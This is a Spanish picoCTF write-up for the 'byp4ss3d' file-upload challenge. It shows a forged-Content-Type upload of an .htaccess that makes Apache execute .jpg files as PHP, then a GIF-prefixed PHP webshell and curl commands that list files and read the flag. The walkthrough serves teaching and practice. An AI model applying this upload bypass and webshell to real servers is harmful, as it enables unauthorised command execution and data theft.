# Writeup: byp4ss3d
**Categoría:** Medium
**Fecha de conversión:** 2026-04-24

---

Writeup: picoCTF - ByPass3d (Server Bypass)

Descripción del reto


El reto consiste en un servidor web que permite subir archivos de imagen (JPG, PNG, GIF) para verificar una identificación de estudiante. El objetivo es encontrar una forma de ejecutar comandos en el servidor y leer la flag, que se encuentra en /var/www/flag.txt.

Reconocimiento inicial


La página principal (index.php) muestra un formulario de subida:

html


<form action="upload.php" method="post" enctype="multipart/form-data">

```
    <input type="file" name="image" accept="image/*">
    <input type="submit" value="Upload ID">
```

</form>


Al inspeccionar el código fuente de upload.php no es accesible directamente, pero sabemos que las imágenes subidas se guardan en el directorio images/.

Primer intento: subir una webshell camuflada


Subimos un archivo shell.php.jpg con el siguiente contenido:

php


<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>


El servidor lo acepta y nos dice: Access it at: images/shell.php.jpg.


Pero al acceder con ?cmd=ls, el servidor devuelve el código fuente del PHP, no su ejecución. Esto indica que Apache no interpreta los archivos .jpg como PHP (lo normal).

Problema 1: ejecutar código PHP en un archivo con extensión de imagen


### Solución: Subir un archivo .htaccess que fuerce a Apache a tratar los .jpg como PHP.

Creación del .htaccess


La directiva necesaria es:

text


AddType application/x-httpd-php .jpg


Pero el formulario de subida solo acepta imágenes. Necesitamos camuflar el .htaccess como una imagen.

Segundo intento: subir el .htaccess con cabecera GIF


Creamos un archivo .htaccess que comience con la firma GIF:

bash


echo 'GIF89a; AddType application/x-httpd-php .jpg' > .htaccess


Lo subimos con curl forzando el Content-Type a image/jpeg:

bash


curl -F "image=@.htaccess;filename=.htaccess;type=image/jpeg" http://amiable-citadel.picoctf.net:52370/upload.php


El servidor responde: Successfully uploaded! Access it at: images/.htaccess.


Pero al intentar leer el .htaccess (o ejecutar shell.php.jpg), obtenemos un error 500 Internal Server Error.

Problema 2: error 500 en el .htaccess


La cabecera GIF89a; no es una directiva Apache válida y rompe la sintaxis. Necesitamos un .htaccess válido pero que también pase la validación de imágenes.


### Solución: Subir el .htaccess sin la cabecera gráfica, pero engañando el validador mediante el Content-Type. Muchos servidores solo comprueban el tipo MIME reportado, no los bytes mágicos.

Creación del .htaccess limpio

bash


echo 'AddType application/x-httpd-php .jpg' > .htaccess


Lo subimos especificando type=image/jpeg:

bash


curl -F "image=@.htaccess;filename=.htaccess;type=image/jpeg" http://amiable-citadel.picoctf.net:52370/upload.php


Esta vez la subida fue exitosa y no hubo error 500 al acceder a otros archivos.

Tercer paso: crear y subir una webshell en formato .jpg


Creamos un archivo cmd.jpg que contiene código PHP precedido de la cabecera GIF89a; para que el validador del formulario lo acepte como imagen:

bash


echo 'GIF89a; <?php system($_GET["cmd"]); ?>' > cmd.jpg


Lo subimos:

bash


curl -F "image=@cmd.jpg;filename=cmd.jpg;type=image/jpeg" http://amiable-citadel.picoctf.net:52370/upload.php


Respuesta: Successfully uploaded! Access it at: images/cmd.jpg

Comprobación de la ejecución de comandos


Probamos el comando ls:

bash


curl "http://amiable-citadel.picoctf.net:52370/images/cmd.jpg?cmd=ls"


Salida:

text


GIF89a; cmd.jpg


Vemos que el servidor ejecutó el PHP, pero la salida incluye la cabecera GIF89a;. Eso es normal porque el archivo comienza con esos bytes. El comando ls listó el archivo cmd.jpg.


Para obtener más información, usamos ls -la:

bash


curl "http://amiable-citadel.picoctf.net:52370/images/cmd.jpg?cmd=ls%20-la"


Salida:

text


GIF89a; total 8

drwxr-xr-x 1 www-data root     38 Apr 24 16:07 .

drwxrwxrwt 1 www-data www-data 20 Sep 26  2025 ..

-rw-r--r-- 1 www-data www-data 37 Apr 24 16:05 .htaccess

-rw-r--r-- 1 www-data www-data 39 Apr 24 16:07 cmd.jpg


Perfecto: ahora el .htaccess está activo y los .jpg se ejecutan como PHP.

Exploración del sistema


Listamos la raíz del servidor:

bash


curl "http://amiable-citadel.picoctf.net:52370/images/cmd.jpg?cmd=ls%20/"


Salida:

text


GIF89a; bin

boot

challenge

dev

etc

home

lib

lib64

media

mnt

opt

proc

root

run

sbin

srv

sys

tmp

usr

var


Observamos un directorio challenge y var. Buscamos archivos con "flag" en el nombre:

bash


curl "http://amiable-citadel.picoctf.net:52370/images/cmd.jpg?cmd=find%20/%20-name%20%22*flag*%22%202>/dev/null"


Entre muchas rutas del sistema, encontramos: /var/www/flag.txt.


Finalmente, leemos la **flag**:

bash


curl "http://amiable-citadel.picoctf.net:52370/images/cmd.jpg?cmd=cat%20/var/www/flag.txt"


Salida:

text


GIF89a; picoCTF{*************************}


Resumen de problemas y soluciones

Problema	Solución

El servidor no ejecuta los .jpg como PHP.	Subir un .htaccess con AddType application/x-httpd-php .jpg.

El .htaccess con cabecera GIF89a causaba error 500.	Subir el .htaccess sin la cabecera, solo con la directiva, y forzar Content-Type: image/jpeg en curl.

El archivo PHP con extensión .jpg contenía la cabecera GIF89a que se mostraba en la salida.	Es aceptable, la flag se obtiene igual.

Los comandos con espacios en la URL deben estar codificados.	Usar %20 en lugar de espacios (ej: ls%20-la).

Lecciones aprendidas


```
    Bypass de validación de subida: A veces basta con manipular el Content-Type para engañar al servidor.

    .htaccess como vector de ataque: Permite reconfigurar el comportamiento de Apache en un directorio.

    Los errores 500 pueden deberse a sintaxis incorrecta en .htaccess; siempre probar con directivas simples.

    La enumeración del sistema con comandos como find y cat es clave para localizar la flag.
```

